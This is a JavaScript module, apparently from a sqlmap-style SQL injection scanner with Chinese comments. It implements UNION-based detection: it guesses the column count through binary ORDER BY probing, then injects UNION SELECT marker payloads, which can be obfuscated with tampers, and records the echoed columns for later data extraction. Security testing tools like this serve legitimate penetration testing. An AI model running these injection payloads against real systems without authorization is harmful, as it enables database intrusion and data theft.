import { Detector } from '../Detector.js';
import { createDetectionResult } from '../models.js';
import { fillPayload } from '../payloads.js';
import { guessColumnsBinary, resolveUnionColumns } from '../injection.js';

const MARKER = 'SQLISCANNER';

// 联合查询注入检测器
// 思路：ORDER BY 猜列数 → UNION SELECT 注入带标记的字符串 → 检测标记是否回显
export class UnionDetector extends Detector {
  constructor() {
    super('union');
  }

  /**
   * @param {object} ctx { httpClient, target, point, dbms, config }
   * @returns {Promise<import('../models.js').DetectionResult>}
   */
  async detect(ctx) {
    const { httpClient, target, point, dbms } = ctx;
    const result = createDetectionResult(point.id, 'union');
    const maxCols = ctx.config?.maxColumnsGuess ?? 50;

    // 基线响应长度，用于判断 ORDER BY 是否超出列数
    const baseReq = this.buildRequest(target, point, point.originalValue || '1');
    const baseline = await this.send(httpClient, ctx, baseReq, ctx);
    const baseLen = String(baseline?.data ?? '').length;

    // 1) 猜列数（ORDER BY 二分枚举，O(log n) 替代线性 O(n)，对齐 sqlmap）
    //    --union-cols 支持精确值（跳过枚举）或范围（约束枚举上下界）
    const colSpec = resolveUnionColumns(ctx.config, maxCols);
    let columns;
    if (colSpec && colSpec.exact != null) {
      columns = colSpec.exact;
    } else {
      columns = await guessColumnsBinary(
        httpClient,
        ctx,
        baseLen,
        colSpec ? colSpec.max : maxCols,
        colSpec ? colSpec.min : 1
      );
    }

    // 2) 用标记字符串定位回显列（标记基串可由 config.unionChar 覆盖，默认 SQLISCANNER）
    const base = (ctx.config && ctx.config.unionChar) || MARKER;
    const markers = Array.from({ length: columns }, (_, i) => `'${base}${i}'`).join(',');
    const unionPayload = fillPayload('{ORIG} UNION SELECT {MARKERS}', {
      orig: point.originalValue || '1',
    }).replace('{MARKERS}', markers);
    const res = await this.send(
      httpClient,
      ctx,
      this.buildRequest(target, point, this.obfuscateValue(ctx, unionPayload)),
      ctx
    );
    const body = String(res?.data ?? '');
    const hitCols = [];
    for (let i = 0; i < columns; i++) {
      // 标记 <base><i> 由扫描器自身确定性生成；randomcase / charunicodeencode 等 tamper
      // 会改变其大小写，故做大小写不敏感匹配，避免回显标记大小写被打乱时 UNION 漏报。
      if (body.toLowerCase().includes(`${base}${i}`.toLowerCase())) hitCols.push(i);
    }

    if (hitCols.length > 0) {
      result.vulnerable = true;
      result.dbms = dbms;
      result.evidence = `UNION 注入成功，回显列：${hitCols.join(',')}（列数 ${columns}）`;
      result.payloads = [unionPayload, `${point.originalValue || '1'} ORDER BY ${columns}-- -`];
      point.confirmed = true;
      point.technique = 'union';
      point.dbms = dbms;
      // 记录回显列与列数，供 Extractor/DBFingerprinter 复用（避免各自硬编第 2 列）
      point.echoCols = hitCols;
      point.columns = columns;
    }
    return result;
  }
}

export default UnionDetector;
